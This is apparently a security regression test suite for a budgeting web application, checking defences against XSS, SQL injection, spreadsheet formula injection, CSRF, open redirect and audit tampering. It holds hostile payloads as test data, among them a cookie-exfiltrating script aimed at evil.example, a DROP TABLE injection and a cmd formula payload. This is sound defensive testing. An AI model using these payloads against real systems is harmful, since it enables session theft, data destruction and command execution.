/**
 * Security regression tests.
 *
 * Each block names the requirement it defends and, where it matters, the attack
 * it is standing in for. These are the tests that should fail loudly if someone
 * "simplifies" a control later.
 */

import { inflateRawSync } from 'node:zlib';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { sql } from '../packages/api/src/db/pool.ts';
import { escapeSpreadsheetValue } from '../packages/api/src/services/xlsx.ts';
import { safeRedirectPath, mapGroupsToRole } from '../packages/api/src/auth/oidc.ts';
import { identifier } from '../packages/api/src/db/pool.ts';
import { buildCsp } from '../packages/api/src/http/security.ts';
import { loadConfig } from '../packages/api/src/config.ts';
import { createHarness, type AuthHeaders, type Harness } from './harness.ts';

let harness: Harness;
let finance: AuthHeaders;
let cfo: AuthHeaders;
let entityId: string;
let lineId: string;

beforeAll(async () => {
  harness = await createHarness();
  finance = await harness.as('finance@birgma.test');
  cfo = await harness.as('cfo@birgma.test');

  const owned = await harness.db.one<{ entity_id: string }>(sql`
    select eo.entity_id from entity_owners eo
    join entities e on e.id = eo.entity_id
    where eo.user_id = ${finance.userId} and e.residency = 'eu' limit 1
  `);
  entityId = owned!.entity_id;
  const line = await harness.db.one<{ id: string }>(sql`
    select id from line_items where entity_id = ${entityId} and cost_type = 'opex' limit 1
  `);
  lineId = line!.id;
});

afterAll(async () => {
  await harness?.close();
});

/**
 * Pulls `xl/worksheets/sheet1.xml` out of a generated workbook by walking the
 * zip's local file headers and inflating the entry. Small enough to be obvious,
 * and it keeps the assertion on the real artefact a recipient would open.
 */
function extractSheetXml(zipBuffer: Buffer): string {
  const target = Buffer.from('xl/worksheets/sheet1.xml', 'utf8');
  let offset = 0;
  while (offset < zipBuffer.length - 4) {
    if (zipBuffer.readUInt32LE(offset) !== 0x04034b50) break;
    const compressedSize = zipBuffer.readUInt32LE(offset + 18);
    const nameLength = zipBuffer.readUInt16LE(offset + 26);
    const extraLength = zipBuffer.readUInt16LE(offset + 28);
    const nameStart = offset + 30;
    const name = zipBuffer.subarray(nameStart, nameStart + nameLength);
    const dataStart = nameStart + nameLength + extraLength;

    if (name.equals(target)) {
      return inflateRawSync(zipBuffer.subarray(dataStart, dataStart + compressedSize)).toString('utf8');
    }
    offset = dataStart + compressedSize;
  }
  throw new Error('sheet1.xml not found in the workbook');
}

const authed = (h: AuthHeaders, json = true) => ({
  cookie: h.cookie,
  'x-csrf-token': h['x-csrf-token'],
  origin: h.origin,
  ...(json ? { 'content-type': 'application/json' } : {}),
});

// ---------------------------------------------------------------------------

describe('SEC-031 stored XSS', () => {
  /**
   * The product stores attacker-influenced free text in justifications,
   * comments, information requests and cost-centre descriptions. Each payload
   * must round-trip as *data*: stored verbatim, returned verbatim, and rendered
   * inert by the framework's output encoding — not stripped on the way in,
   * which would be a deny-list and would corrupt legitimate text.
   */
  const PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '"><script>alert(document.cookie)</script>',
    "javascript:alert('xss')",
    '<svg/onload=alert(1)>',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '<script>alert(1)</script>',
    "'-alert(1)-'",
    '<iframe src="javascript:alert(1)">',
  ];

  for (const payload of PAYLOADS) {
    it(`round-trips ${payload.slice(0, 28)} as inert text`, async () => {
      const version = await harness.db.one<{ version: number }>(sql`
        select version from line_items where id = ${lineId}
      `);

      const write = await harness.app.inject({
        method: 'PATCH',
        url: `/api/lines/${lineId}`,
        headers: authed(finance),
        payload: { justification: payload, version: version!.version },
      });
      expect(write.statusCode, write.body).toBe(200);

      const read = await harness.app.inject({
        method: 'GET',
        url: `/api/lines/${lineId}`,
        headers: authed(finance, false),
      });
      const body = read.json() as { line: { justification: string } };

      // Stored and returned unchanged — no silent mutation of the user's text.
      expect(body.line.justification).toBe(payload.trim());

      // And the JSON response is not HTML: an injected payload cannot become
      // markup in transit, whatever the client does with it.
      expect(read.headers['content-type']).toContain('application/json');
    });
  }

  it('stores a payload in a comment without executing or altering it', async () => {
    const payload = '<script>fetch("//evil.example/"+document.cookie)</script>';
    const created = await harness.app.inject({
      method: 'POST',
      url: `/api/lines/${lineId}/comments`,
      headers: authed(finance),
      payload: { body: payload },
    });
    expect(created.statusCode).toBe(201);

    const read = await harness.app.inject({
      method: 'GET',
      url: `/api/lines/${lineId}`,
      headers: authed(finance, false),
    });
    const body = read.json() as { comments: { body: string }[] };
    expect(body.comments.some((c) => c.body === payload)).toBe(true);
  });
});

describe('SEC-020 injection', () => {
  it('treats SQL metacharacters in search as data, not syntax', async () => {
    // If the audit search built SQL by concatenation, this would either error
    // or return everything. Parameterised, it simply matches nothing.
    const response = await harness.app.inject({
      method: 'GET',
      url: `/api/audit?q=${encodeURIComponent("' or 1=1 --")}`,
      headers: authed(cfo, false),
    });
    expect(response.statusCode).toBe(200);
    expect((response.json() as { events: unknown[] }).events).toEqual([]);
  });

  it('survives a drop-table attempt in a stored field', async () => {
    const version = await harness.db.one<{ version: number }>(sql`
      select version from line_items where id = ${lineId}
    `);
    const response = await harness.app.inject({
      method: 'PATCH',
      url: `/api/lines/${lineId}`,
      headers: authed(finance),
      payload: { vendor: "Robert'); DROP TABLE line_items;--", version: version!.version },
    });
    expect(response.statusCode).toBe(200);

    const still = await harness.db.one<{ n: string }>(sql`
      select count(*)::text as n from line_items
    `);
    expect(Number(still!.n)).toBeGreaterThan(0);
  });

  it('refuses an identifier that is not on the allow-list', () => {
    expect(() => identifier('created_at desc', ['ae.seq desc'])).toThrow(/allow-list/);
    expect(() => identifier('1; drop table users', ['ae.seq desc'])).toThrow();
    expect(identifier('ae.seq desc', ['ae.seq desc']).value).toBe('ae.seq desc');
  });
});

describe('SEC-023 spreadsheet formula injection', () => {
  it.each([
    ['=1+1', "'=1+1"],
    ['+1', "'+1"],
    ['-1', "'-1"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['=cmd|\'/c calc\'!A1', "'=cmd|'/c calc'!A1"],
    ['\tTabbed', "'\tTabbed"],
    ['\rCarriage', "'\rCarriage"],
  ])('neutralises %s', (input, expected) => {
    expect(escapeSpreadsheetValue(input)).toBe(expected);
  });

  it('leaves ordinary text alone', () => {
    expect(escapeSpreadsheetValue('Partner Be-Terna')).toBe('Partner Be-Terna');
    expect(escapeSpreadsheetValue('')).toBe('');
  });

  it('escapes a malicious vendor name in a real export', async () => {
    const version = await harness.db.one<{ version: number }>(sql`
      select version from line_items where id = ${lineId}
    `);
    await harness.app.inject({
      method: 'PATCH',
      url: `/api/lines/${lineId}`,
      headers: authed(finance),
      payload: { vendor: '=HYPERLINK("//evil.example","click")', version: version!.version },
    });

    const admin = await harness.as('admin@birgma.test');
    const response = await harness.app.inject({
      method: 'GET',
      url: '/api/reports/export.xlsx',
      headers: authed(admin, false),
    });
    expect(response.statusCode).toBe(200);
    expect(response.headers['content-disposition']).toContain('attachment');

    // Inspect the actual workbook rather than trusting the writer: inflate the
    // sheet XML out of the zip and confirm the payload is present, neutralised
    // by the leading apostrophe, and never written as a bare formula.
    const xml = extractSheetXml(response.rawPayload);
    expect(xml).toContain('&apos;=HYPERLINK');
    expect(xml).not.toMatch(/<t[^>]*>=HYPERLINK/);
  });
});

describe('SEC-034 CSRF and origin', () => {
  it('rejects a state-changing request with no CSRF token', async () => {
    const response = await harness.app.inject({
      method: 'POST',
      url: `/api/lines/${lineId}/comments`,
      headers: { cookie: finance.cookie, origin: finance.origin, 'content-type': 'application/json' },
      payload: { body: 'no token' },
    });
    expect(response.statusCode).toBe(403);
  });

  it('rejects a forged CSRF token', async () => {
    const response = await harness.app.inject({
      method: 'POST',
      url: `/api/lines/${lineId}/comments`,
      headers: {
        cookie: finance.cookie,
        origin: finance.origin,
        'x-csrf-token': 'forged-token-value',
        'content-type': 'application/json',
      },
      payload: { body: 'forged' },
    });
    expect(response.statusCode).toBe(403);
  });

  it('rejects a cross-origin state-changing request', async () => {
    const response = await harness.app.inject({
      method: 'POST',
      url: `/api/lines/${lineId}/comments`,
      headers: {
        ...authed(finance),
        origin: 'https://evil.example',
      },
      payload: { body: 'cross origin' },
    });
    expect(response.statusCode).toBe(403);
  });

  it('rejects a cross-site request even when Origin is absent', async () => {
    const response = await harness.app.inject({
      method: 'POST',
      url: `/api/lines/${lineId}/comments`,
      headers: {
        cookie: finance.cookie,
        'x-csrf-token': finance['x-csrf-token'],
        'sec-fetch-site': 'cross-site',
        'content-type': 'application/json',
      },
      payload: { body: 'no origin header' },
    });
    expect(response.statusCode).toBe(403);
  });
});

describe('SEC-011 object-level authorisation', () => {
  it('returns 404, not 403, for another entity on a read path', async () => {
    const pmo = await harness.as('pmo@birgma.test');
    const response = await harness.app.inject({
      method: 'GET',
      url: `/api/budget/${entityId}`,
      headers: authed(pmo, false),
    });
    // 403 here would confirm the identifier exists. 404 tells the caller
    // nothing they did not already know.
    expect(response.statusCode).toBe(404);
  });

  it('does not leak an entity from another residency region', async () => {
    const cn = await harness.db.one<{ id: string }>(sql`
      select id from entities where residency = 'cn' limit 1
    `);
    const admin = await harness.as('admin@birgma.test');
    const response = await harness.app.inject({
      method: 'GET',
      url: `/api/budget/${cn!.id}`,
      headers: authed(admin, false),
    });
    // CMP-140: an EU deployment does not serve mainland-China rows, even to an
    // administrator whose capability would otherwise permit it.
    expect(response.statusCode).toBe(404);
  });

  it('does not leak another region through the audit trail', async () => {
    // FR-071 + CMP-140. `audit.viewAll` means every actor's events, not every
    // region's — and an audit detail carries entity codes, line names and
    // amounts, so an unscoped list is the same disclosure the consolidation
    // report refuses to make.
    const cn = await harness.db.one<{ id: string; code: string }>(sql`
      select id, code from entities where residency = 'cn' limit 1
    `);
    const admin = await harness.as('admin@birgma.test');

    await harness.db.query(sql`
      insert into audit_events
        (actor_user_id, actor_role, action, target_type, target_id, entity_id, detail, kind)
      values (${admin.userId}, 'admin', 'line.update', 'line', null, ${cn!.id},
              'SECRET-CN-DETAIL', 'change')
    `);
    // A governance event with no entity must stay visible whatever the region.
    await harness.db.query(sql`
      insert into audit_events
        (actor_user_id, actor_role, action, target_type, target_id, entity_id, detail, kind)
      values (${admin.userId}, 'admin', 'backup.run', 'backup', null, null,
              'GROUP-WIDE-DETAIL', 'governance')
    `);

    const response = await harness.app.inject({
      method: 'GET', url: '/api/audit?limit=200', headers: authed(admin, false),
    });
    const body = response.body;
    expect(body).not.toContain('SECRET-CN-DETAIL');
    expect(body).toContain('GROUP-WIDE-DETAIL');
  });

  it('shows an audit event whose entity has since been deleted', async () => {
    // `audit_events.entity_id` deliberately has no foreign key so the trail
    // outlives the row. A residency filter written as `exists` would hide the
    // entity.delete event itself.
    const admin = await harness.as('admin@birgma.test');
    await harness.db.query(sql`
      insert into audit_events
        (actor_user_id, actor_role, action, target_type, target_id, entity_id, detail, kind)
      values (${admin.userId}, 'admin', 'entity.delete', 'entity', null,
              '00000000-0000-4000-8000-0000000000ff', 'DELETED-ENTITY-DETAIL', 'governance')
    `);
    const response = await harness.app.inject({
      method: 'GET', url: '/api/audit?limit=200', headers: authed(admin, false),
    });
    expect(response.body).toContain('DELETED-ENTITY-DETAIL');
  });

  it('serves another region only when that region is declared', async () => {
    // The central-deployment case (CMP-140). The mechanism is unchanged — one
    // allow-list, applied in one resolver — but a central deployment has to be
    // able to declare more than one entry, and this proves both directions:
    // narrow by default, wide only when someone says so.
    const wide = await createHarness({
      rateLimit: 'off',
      env: { RESIDENCY_REGION: 'eu', SERVED_REGIONS: 'eu,ch,apac,cn' },
    });
    try {
      const admin = await wide.as('admin@birgma.test');
      const cn = await wide.db.one<{ id: string }>(sql`
        select id from entities where residency = 'cn' limit 1
      `);

      const list = await wide.app.inject({
        method: 'GET', url: '/api/entities', headers: authed(admin, false),
      });
      const regions = new Set(
        (list.json() as { residency: string }[]).map((e) => e.residency),
      );
      expect([...regions].sort()).toEqual(['apac', 'ch', 'cn', 'eu']);

      // And the aggregate follows the same set, because it goes through the
      // same resolver rather than filtering afterwards.
      const grid = await wide.app.inject({
        method: 'GET', url: `/api/budget/${cn!.id}`, headers: authed(admin, false),
      });
      expect(grid.statusCode).toBe(200);
    } finally {
      await wide.close();
    }
  });

  it('refuses an unauthenticated request', async () => {
    const response = await harness.app.inject({ method: 'GET', url: '/api/entities' });
    expect(response.statusCode).toBe(401);
  });
});

describe('SEC-012 segregation of duties', () => {
  it('refuses to let the submitter approve their own submission', async () => {
    const submission = await harness.db.one<{ id: string }>(sql`
      insert into submissions (entity_id, fiscal_year, submitted_by)
      values (${entityId}, 2026, ${cfo.userId}) returning id
    `);
    const response = await harness.app.inject({
      method: 'POST',
      url: `/api/submissions/${submission!.id}/decision`,
      headers: authed(cfo),
      payload: { decision: 'approve', comment: 'self-approval attempt' },
    });
    expect(response.statusCode).toBe(403);
  });

  it('enforces submission SoD in the database as well as the handler', async () => {
    await expect(
      harness.db.query(sql`
        insert into submissions (entity_id, fiscal_year, submitted_by, decided_by, state)
        values (${entityId}, 2026, ${cfo.userId}, ${cfo.userId}, 'approved')
      `),
    ).rejects.toThrow(/submission_sod/);
  });

  it('enforces cost-centre SoD in the database', async () => {
    await expect(
      harness.db.query(sql`
        insert into cost_centres (code, description, created_by, approved_by, status)
        values ('CC-SOD', 'sod probe', ${cfo.userId}, ${cfo.userId}, 'approved')
      `),
    ).rejects.toThrow(/cost_centre_sod/);
  });
});

describe('FR-073 audit immutability', () => {
  it('refuses an UPDATE on an audit event', async () => {
    await expect(
      harness.db.query(sql`update audit_events set detail = 'tampered' where seq = 1`),
    ).rejects.toThrow(/append-only/);
  });

  it('refuses a DELETE outside the retention job', async () => {
    await expect(
      harness.db.query(sql`delete from audit_events where seq = 1`),
    ).rejects.toThrow(/retention job/);
  });

  it('verifies the hash chain end to end', async () => {
    const row = await harness.db.one<{ bad: string | null }>(sql`
      select audit_verify_chain()::text as bad
    `);
    expect(row!.bad).toBeNull();
  });

  it('detects tampering performed with the trigger disabled', async () => {
    // Stands in for a compromised superuser or a doctored backup restore: the
    // trigger can be turned off, but the chain still records what was there.
    await harness.db.query(sql`alter table audit_events disable trigger audit_immutable_guard`);
    await harness.db.query(sql`alter table audit_events disable trigger audit_link_before_insert`);
    const original = await harness.db.one<{ detail: string }>(sql`
      select detail from audit_events where seq = 1
    `);
    await harness.db.query(sql`update audit_events set detail = 'tampered' where seq = 1`);

    const broken = await harness.db.one<{ bad: string | null }>(sql`
      select audit_verify_chain()::text as bad
    `);
    expect(broken!.bad).toBe('1');

    await harness.db.query(sql`
      update audit_events set detail = ${original!.detail} where seq = 1
    `);
    await harness.db.query(sql`alter table audit_events enable trigger audit_immutable_guard`);
    await harness.db.query(sql`alter table audit_events enable trigger audit_link_before_insert`);

    const restored = await harness.db.one<{ bad: string | null }>(sql`
      select audit_verify_chain()::text as bad
    `);
    expect(restored!.bad).toBeNull();
  });
});

describe('FR-071 audit scoping', () => {
  it('gives a manager only their own events, filtered in the query', async () => {
    const pmo = await harness.as('pmo@birgma.test');
    const response = await harness.app.inject({
      method: 'GET',
      url: '/api/audit?limit=200',
      headers: authed(pmo, false),
    });
    const body = response.json() as { scope: string; events: { actor_name: string }[] };
    expect(body.scope).toBe('own');
    // Nothing authored by anyone else is present — not hidden, absent.
    expect(body.events.every((e) => e.actor_name === 'PMO Lead')).toBe(true);
  });

  it('gives the CFO everything', async () => {
    const response = await harness.app.inject({
      method: 'GET',
      url: '/api/audit?limit=5',
      headers: authed(cfo, false),
    });
    expect((response.json() as { scope: string }).scope).toBe('all');
  });
});

describe('SEC-013 rate limiting', () => {
  it('throttles repeated exports', async () => {
    const admin = await harness.as('admin@birgma.test');
    const codes: number[] = [];
    for (let i = 0; i < 8; i += 1) {
      const response = await harness.app.inject({
        method: 'GET',
        url: '/api/reports/export.xlsx',
        headers: authed(admin, false),
      });
      codes.push(response.statusCode);
    }
    // Mass export is both expensive and the shape of an exfiltration attempt.
    expect(codes).toContain(429);
  });
});

describe('SEC-032 / SEC-033 headers', () => {
  it('emits a nonce-based CSP with no unsafe directives', async () => {
    const response = await harness.app.inject({ method: 'GET', url: '/healthz' });
    const csp = response.headers['content-security-policy'] as string;
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toMatch(/script-src 'self' 'nonce-[A-Za-z0-9+/=]+'/);
    expect(csp).not.toContain('unsafe-inline');
    expect(csp).not.toContain('unsafe-eval');
  });

  it('declares an icon inline, so no request escapes the asset map', async () => {
    // The shell serves /assets/* by exact filename and nothing else, so a page
    // that let the browser guess /favicon.ico produced a 404 on every load.
    // The icon is a data URI: an inline image, which `img-src 'self' data:'
    // permits, and not an inline script or style, which the CSP forbids.
    const response = await harness.app.inject({ method: 'GET', url: '/' });
    expect(response.statusCode).toBe(200);
    expect(response.body).toMatch(/<link rel="icon" href="data:image\/svg\+xml,/);
    // Still no inline script or style anywhere in the shell.
    expect(response.body).not.toMatch(/<style/);
    expect(response.body).not.toMatch(/<script(?![^>]*\bsrc=)/);
  });

  it('issues a different nonce per response', async () => {
    const a = await harness.app.inject({ method: 'GET', url: '/healthz' });
    const b = await harness.app.inject({ method: 'GET', url: '/healthz' });
    expect(a.headers['content-security-policy']).not.toBe(b.headers['content-security-policy']);
  });

  it('sets the remaining hardening headers', async () => {
    const response = await harness.app.inject({ method: 'GET', url: '/healthz' });
    expect(response.headers['x-content-type-options']).toBe('nosniff');
    expect(response.headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
    expect(response.headers['x-frame-options']).toBe('DENY');
    expect(response.headers['cache-control']).toBe('no-store');
    expect(response.headers['permissions-policy']).toContain('camera=()');
    expect(response.headers['x-powered-by']).toBeUndefined();
  });

  it('builds a CSP without unsafe directives for any nonce', () => {
    const csp = buildCsp('abc123', '/report');
    expect(csp).not.toMatch(/unsafe/);
  });
});

describe('SEC-035 open redirect', () => {
  it.each([
    ['//evil.example', '/'],
    ['https://evil.example', '/'],
    ['/\\evil.example', '/'],
    ['/budget', '/budget'],
    ['/budget?x=1', '/budget?x=1'],
    ['javascript:alert(1)', '/'],
    ['/legit\nSet-Cookie: x=1', '/'],
  ])('normalises %s', (input, expected) => {
    expect(safeRedirectPath(input)).toBe(expected);
  });
});

describe('ZT-004 role mapping', () => {
  it('maps a single group to its role', () => {
    expect(mapGroupsToRole(['SG-Spendifre-CFO'])).toBe('cfo');
  });

  it('takes the least privileged role when a principal is in several groups', () => {
    // Membership sprawl must not silently escalate.
    expect(mapGroupsToRole(['SG-Spendifre-Admin', 'SG-Spendifre-Mgr-PMO'])).toBe('pmo');
  });

  it('returns null for an unknown group', () => {
    expect(mapGroupsToRole(['SG-Something-Else'])).toBeNull();
    expect(mapGroupsToRole([])).toBeNull();
  });
});

describe('Configuration fails closed', () => {
  const base = {
    NODE_ENV: 'production',
    DATABASE_URL: 'postgres://x/y',
    TELEMETRY_SALT: 'a-sufficiently-long-salt',
    PUBLIC_ORIGIN: 'https://spendifre.example',
    ENTRA_TENANT_ID: 't',
    ENTRA_CLIENT_ID: 'c',
    ENTRA_CLIENT_SECRET: 's',
  };

  // Region and replica parsing happens after the production cross-checks, so
  // these use a base that satisfies them rather than tripping on DB_SSL_MODE.
  const valid = { ...base, DB_SSL_MODE: 'verify-full' };

  it('serves only its own region unless told otherwise', () => {
    // The conservative default, and the behaviour the setting had before it
    // existed. Nothing widens by upgrading.
    expect(loadConfig({ ...valid, RESIDENCY_REGION: 'eu' }).servedRegions).toEqual(['eu']);
    expect(loadConfig({ ...valid, RESIDENCY_REGION: 'eu', SERVED_REGIONS: '' }).servedRegions)
      .toEqual(['eu']);
  });

  it('serves a declared list, in the order it was written, deduplicated', () => {
    const config = loadConfig({
      ...valid, RESIDENCY_REGION: 'eu', SERVED_REGIONS: ' eu, CH ,apac,eu ',
    });
    expect(config.servedRegions).toEqual(['eu', 'ch', 'apac']);
    // Where it runs is still a single value — the backup AAD binds to it.
    expect(config.RESIDENCY_REGION).toBe('eu');
  });

  it('refuses a region that does not exist', () => {
    expect(() => loadConfig({ ...valid, SERVED_REGIONS: 'eu,atlantis' }))
      .toThrow(/unknown region atlantis/);
  });

  it('refuses a served set that excludes the deployment’s own region', () => {
    // A deployment holding backups bound to a region whose rows it refuses to
    // read is not a restrictive configuration, it is an incoherent one.
    expect(() => loadConfig({ ...valid, RESIDENCY_REGION: 'eu', SERVED_REGIONS: 'apac' }))
      .toThrow(/must include RESIDENCY_REGION/);
  });

  it('divides the rate limit across replicas rather than multiplying it', () => {
    // SEC-013's budget is per deployment; the limiter counts per process.
    expect(loadConfig({ ...valid, REPLICA_COUNT: '4' }).REPLICA_COUNT).toBe(4);
    expect(loadConfig(valid).REPLICA_COUNT).toBe(1);
  });

  it('refuses dev auth in production', () => {
    expect(() => loadConfig({ ...base, DEV_AUTH: 'on' })).toThrow(/DEV_AUTH/);
  });

  it('refuses disabled rate limiting in production', () => {
    expect(() => loadConfig({ ...base, RATE_LIMIT: 'off' })).toThrow(/RATE_LIMIT/);
  });

  it('refuses a plaintext database connection in production', () => {
    // node-postgres does not negotiate TLS unless asked, so an unset mode is a
    // plaintext hop, not an encrypted one (ZT-006).
    expect(() => loadConfig({ ...base, DB_SSL_MODE: 'disable' })).toThrow(/DB_SSL_MODE/);
    expect(() => loadConfig({ ...base, DB_SSL_MODE: 'verify-full' })).not.toThrow();
  });

  it('defaults the database to plaintext only outside production', () => {
    const dev = loadConfig({
      NODE_ENV: 'development',
      DATABASE_URL: 'postgres://x/y',
      TELEMETRY_SALT: 'a-sufficiently-long-salt',
    });
    expect(dev.DB_SSL_MODE).toBe('disable');
  });

  it('refuses plaintext origins in production', () => {
    expect(() => loadConfig({ ...base, PUBLIC_ORIGIN: 'http://spendifre.example' }))
      .toThrow(/https/);
  });

  it('refuses to start in production without Entra configuration', () => {
    const { ENTRA_CLIENT_SECRET: _drop, ...withoutSecret } = base;
    expect(() => loadConfig(withoutSecret)).toThrow(/Entra/);
  });

  it('requires a telemetry salt', () => {
    const { TELEMETRY_SALT: _drop, ...withoutSalt } = base;
    expect(() => loadConfig(withoutSalt)).toThrow(/TELEMETRY_SALT/);
  });
});

describe('SEC-010 route declarations', () => {
  it('refuses to register a route without a security declaration', async () => {
    const { default: Fastify } = await import('fastify');
    const { registerRouteDeclarationCheck } = await import('../packages/api/src/http/guard.ts');
    const app = Fastify();
    registerRouteDeclarationCheck(app);
    expect(() => app.get('/undeclared', async () => ({}))).toThrow(/no security declaration/);
    await app.close();
  });
});

describe('Error responses do not leak internals', () => {
  it('returns a generic body for a validation failure', async () => {
    const response = await harness.app.inject({
      method: 'PATCH',
      url: `/api/lines/${lineId}`,
      headers: authed(finance),
      payload: { name: '', version: 0 },
    });
    expect(response.statusCode).toBe(422);
    const body = response.body;
    expect(body).not.toMatch(/postgres|pg_|select |relation|stack|node_modules/i);
  });

  it('does not echo the submitted value back in an error', async () => {
    const marker = 'REFLECTED_VALUE_MARKER';
    const response = await harness.app.inject({
      method: 'PUT',
      url: `/api/lines/${lineId}/amounts`,
      headers: authed(finance),
      payload: { period: 1, amount: marker, version: 0 },
    });
    expect(response.statusCode).toBe(422);
    expect(response.body).not.toContain(marker);
  });

  it('reports a malformed body as 400, not 500', async () => {
    const response = await harness.app.inject({
      method: 'POST',
      url: `/api/lines/${lineId}/comments`,
      headers: authed(finance),
      payload: '{not valid json',
    });
    expect(response.statusCode).toBe(400);
  });
});

/**
 * ZT-004 idle timeout, and the WCAG 2.2.1 extension that makes it usable.
 *
 * The idle window was recorded and never enforced before this: `last_seen_at`
 * was written on every request and read by nothing, so an abandoned session
 * stayed usable for the whole absolute TTL. These tests are what stop that
 * regressing quietly, because nothing user-visible changes when it does.
 */
describe('ZT-004 idle session timeout', () => {
  let idleHarness: Harness;

  beforeAll(async () => {
    // A one-minute idle window so the test can age a session past it by
    // moving `last_seen_at`, rather than by waiting.
    idleHarness = await createHarness({ rateLimit: 'off', env: { SESSION_IDLE_MINUTES: '1' } });
  });

  afterAll(async () => {
    await idleHarness?.close();
  });

  it('refuses a session idle for longer than the window', async () => {
    const headers = await idleHarness.as('finance@birgma.test');

    const before = await idleHarness.app.inject({
      method: 'GET', url: '/api/me', headers: { cookie: headers.cookie },
    });
    expect(before.statusCode).toBe(200);

    // Age the session rather than sleeping through the window.
    await idleHarness.db.query(sql`
      update sessions set last_seen_at = now() - interval '5 minutes'
    `);

    const after = await idleHarness.app.inject({
      method: 'GET', url: '/api/me', headers: { cookie: headers.cookie },
    });
    expect(after.statusCode).toBe(401);
  });

  it('reports both deadlines so the client can warn before either', async () => {
    const headers = await idleHarness.as('cfo@birgma.test');
    const response = await idleHarness.app.inject({
      method: 'GET', url: '/api/me', headers: { cookie: headers.cookie },
    });

    const { session } = response.json();
    expect(new Date(session.idleDeadline).getTime()).toBeGreaterThan(Date.now());
    // The idle deadline must never outlive the absolute one, or the warning
    // would offer to extend something that cannot be extended.
    expect(new Date(session.idleDeadline).getTime()).toBeLessThanOrEqual(
      new Date(session.absoluteDeadline).getTime(),
    );
    expect(session.warnSecondsBefore).toBeGreaterThanOrEqual(20);
  });

  it('extends the idle window on request without moving the absolute deadline', async () => {
    const headers = await idleHarness.as('admin@birgma.test');
    const first = (await idleHarness.app.inject({
      method: 'GET', url: '/api/me', headers: { cookie: headers.cookie },
    })).json().session;

    await idleHarness.db.query(sql`
      update sessions set last_seen_at = now() - interval '30 seconds'
    `);

    const extended = await idleHarness.app.inject({
      method: 'POST',
      url: '/api/session/extend',
      headers: {
        cookie: headers.cookie,
        'x-csrf-token': headers['x-csrf-token'],
        origin: headers.origin,
      },
    });
    expect(extended.statusCode).toBe(200);

    const body = extended.json();
    expect(new Date(body.idleDeadline).getTime()).toBeGreaterThan(
      new Date(first.idleDeadline).getTime() - 31_000,
    );
    // WCAG 2.2.1 asks for the *limit* to be extendable, not the session to be
    // immortal. The absolute TTL is untouched.
    expect(body.absoluteDeadline).toBe(first.absoluteDeadline);
  });

  it('cannot be used to revive a session that has already expired', async () => {
    const headers = await idleHarness.as('pmo@birgma.test');
    await idleHarness.db.query(sql`
      update sessions set last_seen_at = now() - interval '10 minutes'
    `);

    const response = await idleHarness.app.inject({
      method: 'POST',
      url: '/api/session/extend',
      headers: {
        cookie: headers.cookie,
        'x-csrf-token': headers['x-csrf-token'],
        origin: headers.origin,
      },
    });
    // The guard rejects before the handler runs, so there is no window in
    // which "extend" resurrects something already dead.
    expect(response.statusCode).toBe(401);
  });
});
